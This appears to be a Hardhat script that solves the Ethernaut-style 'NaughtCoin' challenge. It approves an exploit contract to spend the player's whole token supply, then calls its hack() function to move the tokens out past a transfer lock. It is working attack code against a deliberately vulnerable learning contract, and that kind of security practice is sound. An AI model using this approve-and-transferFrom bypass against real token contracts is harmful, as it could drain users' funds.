import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { ethers, network } from "hardhat"
import { NAUGHTCOIN, NAUGHTCOINEXPLOIT } from "../constants"
import { developmentChains, networkConfig } from "../helper-hardhat-config"
import { NaughtCoin, NaughtCoinExploit } from "../typechain-types"

const exploitNaughtCoin = async () => {
    if (!developmentChains.includes(network.name)) {
        const naughtCoin: NaughtCoin = await ethers.getContractAt("NaughtCoin", NAUGHTCOIN)
        const accounts = await ethers.getSigners()
        const deployer: SignerWithAddress = accounts[0]
        const player = await naughtCoin.player()
        const supply = await naughtCoin.totalSupply()
        const playerCoins = await naughtCoin.balanceOf(player)
        console.log("current player", player) //note that player is same as our deployer address
        console.log("total supply", ethers.utils.formatEther(supply))
        console.log("player coins before exploit", ethers.utils.formatEther(playerCoins))

        const naughtCoinExploit: NaughtCoinExploit = await ethers.getContractAt(
            "NaughtCoinExploit",
            NAUGHTCOINEXPLOIT
        )

        // approve spend to NaughCoinExploit contract
        const approveTx = await naughtCoin
            .connect(deployer)
            .approve(naughtCoinExploit.address, supply)
        await approveTx.wait()

        const hackFundTx = await naughtCoinExploit.connect(deployer).hack()
        await hackFundTx.wait(1)

        const playerCoinsAfterExploit = await naughtCoin.balanceOf(player)
        console.log(
            "player coins should be empty. Balance = ",
            ethers.utils.formatEther(playerCoinsAfterExploit)
        )
    }
}

exploitNaughtCoin()
    .then(() => {
        console.log("naught coin exploit successful")
        process.exit(0)
    })
    .catch((e) => {
        console.error(e)
        process.exit(1)
    })
